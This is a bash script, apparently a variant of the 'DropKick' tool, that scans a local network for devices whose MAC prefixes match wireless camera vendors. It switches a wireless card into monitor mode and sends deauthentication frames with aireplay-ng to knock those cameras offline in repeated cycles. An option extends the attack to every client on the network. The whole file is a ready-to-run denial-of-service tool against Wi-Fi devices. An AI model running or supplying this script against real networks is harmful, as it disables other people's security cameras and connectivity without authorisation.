#!/bin/bash
# usage: ./bettererDropKick [options] 
#TODO option to ignore beacon frames
#TODO silence airmon monitor mode control
#TODO uncapitalize

# requires: airmon-ng suite, arp-scan, arping, iwconfig, ifconfig, awk, grep, tr

set -e # Close on any error
shopt -s nocasematch # Set shell to ignore case
shopt -s extglob # For non-interactive shell.

# keep track of the last executed command
trap 'last_command=$current_command; current_command=$BASH_COMMAND' DEBUG
# echo an error message before exiting
trap 'echo "\"${last_command}\" command filed with exit code $?."' EXIT

# make sure the script is root
if [ "$UID" -ne 0 ]; then 
    echo "Please run as root"
    exit
fi

POLL=10
LOOPS=0
COUNTER=0

function printhelp {
    echo 'help command not written yet, options are as follows:'
    echo '-v, verbose'
    echo '-a, use airmon-ng for monitor mode'
    echo '-u, unrestricted mode (attempt to deauth ALL clients, not only cameras)'
    echo '-o, observational mode, do not attempt to deauth clients'
    echo '-k, run airmon-ng check kill before starting monitor mode (conflicts with -l and sets it to 1)'
    echo '-m [mac], specify router mac manually'
    echo '-i [interface], interface (required)'
    echo '-c [channel], network channel'
    echo '-p [seconds], polling rate (default 10)'
    echo '-l [loops], the number of loops to execute before automatically closing (infinite if 0 or undefined)'
    echo '-r, print the version and exit'
    echo '-h, print this help'
    exit 0
}

#getopts
while getopts "vauokm:i:c:p:l:hr" FLAG; do
    case "$FLAG" in
        v) # Set option "v" [verbose]
                readonly VERBOSE=true
                ;;
        a) # Set option "a" [airmon-ng]
                readonly AIRMON=true
                ;;
        u) # Set option "u" [unrestricted mode (deauth all)]
                readonly ALL=true
                ;;
        o) # Set option "o" [observational mode (deauth none)]
                readonly NONE=true
                ;;
        k) # Set option "k" [kill]
                readonly KILL=true
                ;;
        m) # Set option "m" [routermac]
                readonly ROUTERMAC=$OPTARG
                ;;
        i) # Set option "i" [interface]
                readonly INTERFACE=$OPTARG
                ;;
        c) # Set option "c" [channel]
                readonly CHANNEL=$OPTARG
                ;;
        p) # Set option "p" [polling rate]
                readonly POLL=$OPTARG
                ;;
        l) # Set option "l" [loop Number]
                LOOPS=$OPTARG
                ;;
        h) # Set option "h" [help]
                printhelp
                ;;
        r) # Set option "r" [version]
            echo '0.1.0'
            exit 0
            ;;
        *) # Invalid option
            printhelp
            ;;
        esac
    done
shift $((OPTIND-1))  #This tells getopts to move on to the next argument.
# variable declarations
readonly GGMAC='@(30:8C:FB*|00:24:E4*|00:40:8C*|58:70:C6*|00:1F:54*|00:09:18*|74:C2:46*|A0:02:DC*|84:D6:D0*|18:B4:30*)'
MATCHING=()

# force loops to 1 with airmon
if [ "$AIRMON" ]; then
    readonly LOOPS=1
fi

# make sure there is an interface specified
if [ -z "$INTERFACE" ] 
then
    echo "-i is a Required Field, use -h for help"
    exit 1
fi

# manually search for routermac if it is not provided
if [ -z "$ROUTERMAC" ]
then
    echo "Automatically searching for network BSSID; This may be unreliable."
    ROUTERMAC=$(sudo arping -c 1 -I $(ip route show match 0/0 | awk '{print $5, $3}') | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | tr "[:lower:]" "[:upper:]")
    echo "Detected Network BSSID as $ROUTERMAC."
fi

# manually search for channel if it is not provided
if [ -z "$CHANNEL" ]
then
    echo "Automatically searching for network Channel; This may be unreliable."
    CHANNEL=$(iwlist "$INTERFACE" channel | grep 'Current Frequency' | grep 'Channel' | awk '{print $5}' | tr -d ')')
    echo "Detected Network Channel as $CHANNEL."
fi

# main operation loop
while [ "$LOOPS" -gt "$COUNTER" ] || [ "$LOOPS" -eq "0" ]
do

# increment loop counter
((COUNTER+=1))

# add all devices on network matching GGMAC to MATCHING
echo "Beginning Network Scan...  (This may take a while on large networks)"
for TARGET in $(sudo arp-scan -g -I "$INTERFACE" --localnet | awk '{print $2}' | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
do
    if [[ $TARGET == "$GGMAC" ]] || [ $ALL ]
        then
            if [ $VERBOSE ]; then
                echo "MAC $TARGET Matches a Wireless Camera Device, Adding to DeAuth List"
            fi
            MATCHING+=("$TARGET")
        fi
done
if [[ ${#MATCHING[@]} == 0 ]]
then
    echo "No Cameras Detected This Cycle.  Next Cycle Will Begin in $POLL Seconds or Press CTRL + C to Exit"
    sleep "$POLL"
    continue
fi
echo ${#MATCHING[@]} Devices Found.
# check for -o, exit early
if [ ${NONE} ]; then
    for MATCH in "${MATCHING[@]}"
    do
        echo "Detected Camera MAC: $MATCH"
    done
    echo "Cycle Complete.  Next Cycle Will Begin in $POLL Seconds or Press CTRL + C to Exit"
    sleep "$POLL"
    continue
fi

if [ ${KILL} ]; then
    sudo airmon-ng check kill
fi


# engage monitor mode
echo "Starting Monitor Mode on Interface $INTERFACE"
if [ ${AIRMON} ]; then
    sudo airmon-ng start "$INTERFACE" "$CHANNEL"
    MONITOR=$INTERFACE"mon"
else
    echo "Airmon-ng has not been enabled, turning on Monitor Mode manually"
    sudo ip link set "$INTERFACE" down
    sudo iw "$INTERFACE" set monitor control
    sudo ip link set "$INTERFACE" up
    #TODO FIGURE OUT HOW TO FIND BANDWITH OR THIS IS GOING TO FUCK ME LATER 
    sudo iw "$INTERFACE" set channel "$CHANNEL"
    MONITOR=$INTERFACE
fi
echo "Monitor Mode Started"


# normal deauth loop
for MATCH in "${MATCHING[@]}"
do
    echo "DeAuthing $MATCH..."
    if [ $VERBOSE ]; then
        # Loud deauth
        sudo aireplay-ng -0 5 -a "$ROUTERMAC" -c "$MATCH" "$MONITOR" &
    else
        # Silent deauth (suppress printing)
        sudo aireplay-ng -0 5 -a "$ROUTERMAC" -c "$MATCH" "$MONITOR" &> /dev/null
    fi
done

if [ ${AIRMON} ]; then
    sudo airmon-ng stop "$MONITOR"
else
    sudo ip link set "$INTERFACE" down
    sudo iw "$INTERFACE" set type managed
    sudo ip link set "$INTERFACE" up
fi
MATCHING=()
echo '
                             __              __    _     __          __                      
                         ___/ /______  ___  / /__ (_)___/ /_____ ___/ / 
                        / _  / __/ _ \/ _ \/   _// / __/   _/ -_) _  / 
                        \_,_/_/  \___/ .__/_/\_\/_/\__/_/\_\\__/\_,_/  
                                    /_/

                       '
echo "Cycle Complete, Monitor Mode Disabled.  Next Cycle Will Begin in $POLL Seconds or Press CTRL + C to Exit"
sleep "$POLL"
done
echo "$LOOPS loop(s) have been completed, closing."
